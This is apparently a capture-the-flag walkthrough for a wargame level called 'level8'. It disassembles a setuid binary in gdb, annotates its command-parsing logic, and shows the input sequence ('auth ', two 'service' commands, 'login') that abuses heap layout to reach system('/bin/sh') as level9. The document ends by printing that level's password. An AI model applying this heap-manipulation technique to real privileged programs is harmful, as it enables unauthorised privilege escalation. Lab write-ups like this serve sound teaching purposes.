```shell
$> ls -la
[...]
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
[...]

$> ./level8
output: (nil), (nil)
output: 
output: (nil), (nil) 
input:  test
output: (nil), (nil)

$> ./level8 test
(nil), (nil)

# program shows "(nil), (nil)" and asks for input ...
```

```shell
$> gdb -q level8
(gdb) i func
    [...]
    0x08048564  main
    [...]

(gdb) i var
    [...]
    0x08049aac  auth
    0x08049ab0  service
    [...]

# we have only main() here and two variables, auth and service

(gdb) set disassembly-flavor intel
(gdb) disas main
    [...]
    0x08048572 <+14>:    jmp    0x8048575 <main+17>                     # loop start
    [...]
    0x08048575 <+17>:    mov    ecx,DWORD PTR ds:0x8049ab0
    0x0804857b <+23>:    mov    edx,DWORD PTR ds:0x8049aac
    0x08048581 <+29>:    mov    eax,0x8048810
        [...]
    0x0804858e <+42>:    mov    DWORD PTR [esp],eax
    0x08048591 <+45>:    call   0x8048410 <printf@plt>                  #1
    [...]
    0x08048596 <+50>:    mov    eax,ds:0x8049a80
        [...]
    0x080485ae <+74>:    call   0x8048440 <fgets@plt>                   #2
    [...]
    0x080485c1 <+93>:    mov    eax,0x8048819
        [...]
    0x080485cf <+107>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]  #3
    [...]
    0x080485e4 <+128>:   mov    DWORD PTR [esp],0x4
    0x080485eb <+135>:   call   0x8048470 <malloc@plt>
    0x080485f0 <+140>:   mov    ds:0x8049aac,eax
    0x080485f5 <+145>:   mov    eax,ds:0x8049aac                        #3.1
    [...]
    0x08048600 <+156>:   lea    eax,[esp+0x20]
    0x08048604 <+160>:   add    eax,0x5
        [...]
    0x0804861c <+184>:   repnz scas al,BYTE PTR es:[edi]                
        [...]
    0x08048625 <+193>:   cmp    eax,0x1e                                #3.2
    [...]
    0x0804862e <+202>:   lea    edx,[eax+0x5]
    0x08048631 <+205>:   mov    eax,ds:0x8049aac
    0x08048636 <+210>:   mov    DWORD PTR [esp+0x4],edx
    0x0804863a <+214>:   mov    DWORD PTR [esp],eax
    0x0804863d <+217>:   call   0x8048460 <strcpy@plt>                  #3.3
    [...]
    0x08048648 <+228>:   mov    eax,0x804881f
        [...]
    0x08048656 <+242>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]  #4
    [...]
    0x0804866b <+263>:   mov    eax,ds:0x8049aac
        [...]
    0x08048673 <+271>:   call   0x8048420 <free@plt>                    #4.1
    [...]
    0x0804867e <+282>:   mov    eax,0x8048825
        [...]
    0x0804868c <+296>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]  #5
    [...]
    0x080486a1 <+317>:   lea    eax,[esp+0x20]
    0x080486a5 <+321>:   add    eax,0x7
        [...]
    0x080486ab <+327>:   call   0x8048430 <strdup@plt>                  #5.1
    [...]
    0x080486bb <+343>:   mov    eax,0x804882d
        [...]
    0x080486c9 <+357>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]  #6
    [...]
    0x080486e7 <+387>:   mov    eax,DWORD PTR [eax+0x20]
    0x080486ea <+390>:   test   eax,eax
    0x080486ec <+392>:   je     0x80486ff <main+411>                    #6.1
    [...]
    0x080486ee <+394>:   mov    DWORD PTR [esp],0x8048833
    0x080486f5 <+401>:   call   0x8048480 <system@plt>                  #6.1.1
    [...]
    0x080486ff <+411>:   mov    eax,ds:0x8049aa0
        [...]
    0x08048706 <+418>:   mov    eax,0x804883b
        [...]
    0x08048722 <+446>:   call   0x8048450 <fwrite@plt>                  #6.1.2
    [...]
    0x08048727 <+451>:   jmp    0x8048574 <main+16>                     # reloop

#1:     printf() is called to print address ("%p %p\n" (0x8048810)) of auth (0x8049aac) and service (0x8049ab0)
#2:     fgets() is called to read input from stdin (0x8049a80) and store it in buffer
#3:     a strncmp() style logic is called here to compare if input is "auth " (0x8048819)
#3.1:   if yes, malloc() is called to allocate 4 bytes (0x4) of memory and store it in auth (0x8049aac)
#3.2:   a strlen() style logic is called here to check the length of input ([esp+0x20]) + 5 (0x5) and compare if the length is inferior or equal to 0x1e (0x1e)
#3.3:   if yes, strcpy() is called to copy input + 5 ([eax+0x5]) to auth (0x8049aac)
#4:     a strncmp() style logic is called here to compare if input is "reset" (0x804881f)
#4.1:   if yes, free() is called to free auth (0x8049aac)
#5:     a strncmp() style logic is called here to compare if input is "service" (0x8048825)
#5.1:   if yes, strdup() is called to duplicate input ([esp+0x20]) + 7 (0x7) and store it in service (0x8049aac)
#6:     a strncmp() style logic is called here to compare if input is "login" (0x804882d)
#6.1:   if yes, an another comparison is called here to compare if auth[32] ([eax+0x20]) is null
#6.1.1: if not, system("/bin/sh" (0x8048833)) is called.
#6.1.2: if yes, fwrite() is called to write "Password:\n" (0x804883b) to stdout (0x8049aa0)
```

To solve this challenge (arrive at the system("/bin/sh") call), we need to jump the condition of the strncmp() call step by step.

```shell
$> ./level8
output: (nil), (nil) 
input:  auth 
output: 0x804a008, (nil)

# input with "auth " (yes, here have a space) to call the first malloc()
# now 'auth' have a address (0x804a008)

input:  service
output: 0x804a008, 0x804a018

# input with "service" to call the second malloc() and stock a "\n" in the string (because strdup(buffer + 7))
# now 'service' have a address (0x804a018)
# we know malloc() have a inline address, and 16 bytes (x64) for each block of memory
# here we check the 32th bytes of 'auth'
# so now we have:
# "\n"             "\n"             "" (nothing at 32th bytes)
# |----------------|----------------|----------------|----------------|
# auth             service          + we need a one more block of memory (service) to add something in 32th bytes of 'auth'

input:  service
output: 0x804a008, 0x804a028 

# one more call of malloc() ('service') and stock one more "\n" in the string.
# now with inline address of malloc, we can have:
# "\n"             "\n"             "\n"
# |----------------|----------------|----------------|----------------|
# auth             service          service
# auth[32] = '\n'

input:  login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```